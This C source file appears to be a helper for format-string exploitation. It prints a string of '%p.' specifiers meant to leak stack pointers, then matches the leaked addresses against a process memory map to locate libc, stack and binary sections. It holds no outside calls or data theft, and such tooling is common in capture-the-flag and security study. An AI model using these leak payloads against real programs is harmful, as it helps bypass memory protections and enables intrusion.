#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <string.h>

struct memSection {
	char beginAddr[17];
	char endAddr[17];
	char perms[5];
	char sectionName[256];
	struct memSection* next;
	char filled;
};

void freeMemSections(struct memSection* section) {
	if (section->next == NULL) {
		free(section);
	} else {
		freeMemSections(section->next);
	}
}

int fillSections(struct memSection** section, FILE* stream) {
	int retCode = 0;
	char line[1024];

	if (*section == NULL) {
		*section = malloc(sizeof(struct memSection));
		(*section)->next = NULL;
		(*section)->filled = 0;
	}
	struct memSection* cur = *section;
	while (fgets(line, 1023, stream)) {
		while(cur->filled) {
			if (cur->next == NULL) {
				cur->next = malloc(sizeof(struct memSection));
				cur = cur->next;
				cur->next = NULL;
				cur->filled = 0;
				break;
			} else {
				cur = cur->next;
			}
		}
		if (strchr(line, '-') == NULL)
			retCode |= 1;
		else {
			strncpy(cur->beginAddr, line, strchr(line, '-')-line);
			cur->beginAddr[strchr(line,'-')-line] = '\0';
		}
		if (strchr(line, ' ') == NULL)
			retCode |= 2;
		else {
			strncpy(cur->endAddr, strchr(line,'-')+1, strchr(line, ' ')-strchr(line,'-')-1);
			cur->endAddr[strchr(line,' ')-strchr(line,'-')-1] = '\0';
		}
		if (strchr(line,' ') == NULL)
			retCode |= 1;
		else
			strncpy(cur->perms, strchr(line, ' ')+1, 4);
		if (strrchr(line, ' ') == NULL)
			retCode |= 4;
		else {
			strncpy(cur->sectionName, strrchr(line, ' ')+1,256);
			char *nl = strchr(cur->sectionName, '\n');
			*nl = '\0';
		}
		cur->filled = 1;
	}

	return retCode;
}

void printSections(struct memSection* section) {
	struct memSection* cur = section;
	while (cur != NULL) {
		printf("%s-%s %s %s\n", cur->beginAddr, cur->endAddr, cur->perms, cur->sectionName);
		cur = cur->next;
	}
}

int interestingFinder(struct memSection* section, unsigned long long address, int index) {
	int retCode = 0;
	struct memSection* cur = section;
	short isInteresting = 0;
	while (cur != NULL) {
		unsigned long long begin = strtoull(cur->beginAddr, NULL, 16);
		unsigned long long end = strtoull(cur->endAddr, NULL, 16);
		if (address >= begin && address <= end && strlen(cur->sectionName) != 0) {
			if (!isInteresting) {
				isInteresting = 1;
				printf("[%d]: %llx\n", index, address);
			}
			printf("\t%s\n", cur->sectionName);
		}
		cur = cur->next;
	}
	return retCode;
}

void payloadGenerator(int pSize) {
	for (int i = 0; i < pSize-1; ++i) {
		write(STDOUT_FILENO, "%p.", 3);
	}
	write(STDOUT_FILENO, "%p\n", 3);
}

int main(int argc, char* argv[], char* envp[]) {
	int retCode = 0, payloadSize = 0;

	if (argc == 2) { // Payload Generator
		payloadSize = atoi(argv[1]);
		if (payloadSize <= 0) {
			fprintf(stderr, "Payload size invalid, must be >0\n");
			retCode = 1;
		} else {
			payloadGenerator(payloadSize);
		}
	} else if (argc == 3) { // Find interesting values
		FILE *mmFile = fopen(argv[1], "r");
		if (mmFile == NULL) {
			perror("Error opening the memory map file");
			retCode = 2;
			goto mexit;
		}
		FILE *pfFile = fopen(argv[2], "r");
		if (pfFile == NULL) {
			perror("Error opening the printf file");
			retCode = 3;
			fclose(mmFile);
			goto mexit;
		}
		struct memSection* section = NULL;
		fprintf(stderr, "Filling sections... ");
		fillSections(&section, mmFile);
		fprintf(stderr, "OK\n");
		char *line = NULL;
		ssize_t nRead = 0;
		int index = 1;
		while (nRead = getdelim(&line, &(size_t){32}, '.', pfFile), nRead != -1) {
			line[strlen(line)-1] = '\0';
			if (strcmp(line, "(nil)") == 0)
				continue;
			unsigned long long addr = strtoull(line, NULL, 16);
			interestingFinder(section, addr, index);
			++index;
		}
		free(line);
		freeMemSections(section);
	} else {
		fprintf(stderr, "Usage: parser [memory map] [printf output]\n   OR: parser [payload size]\n");
		retCode = 1;
	}
	mexit:
	return retCode;
}
